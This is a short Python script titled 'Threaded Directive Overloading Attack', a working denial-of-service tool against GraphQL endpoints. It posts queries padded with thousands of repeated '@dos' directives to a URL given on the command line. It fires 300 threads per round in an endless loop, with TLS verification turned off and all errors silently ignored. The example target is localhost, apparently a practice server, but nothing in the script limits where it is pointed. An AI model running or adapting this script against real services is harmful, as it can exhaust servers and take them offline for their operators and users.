# Threaded Directive Overloading Attack

import sys
import threading
import requests
import time

def usage():
  print('Usage: python3 {} <target_url> <number_of_directives>'.format(sys.argv[0]))  
  print('Example: python3 {} http://localhost:5013/graphql 30000'.format(sys.argv[0]))
  sys.exit()

if len(sys.argv) < 3:
  print('Missing arguments!')
  usage()

URL = sys.argv[1]
FORCE_MULTIPLIER = int(sys.argv[2])

def start_attack():
  payload = '@dos' * FORCE_MULTIPLIER
  query = {'query': 'query  { __typename ' + payload + ' }'}
  try:
    r = requests.post(URL, json=query, verify=False)
    print('\t HTTP Response', r.text)
    print('\t HTTP Code: '  , str(r.status_code))
  except:
    pass

threads = []

while True:  
  time.sleep(2)
  start = time.time()
  start_attack()
  print(f'Time request took: {time.time() - start}')

  for i in range(300):
    t = threading.Thread(target=start_attack)
    threads.append(t)
    t.start()

  for t in threads:
    t.join()
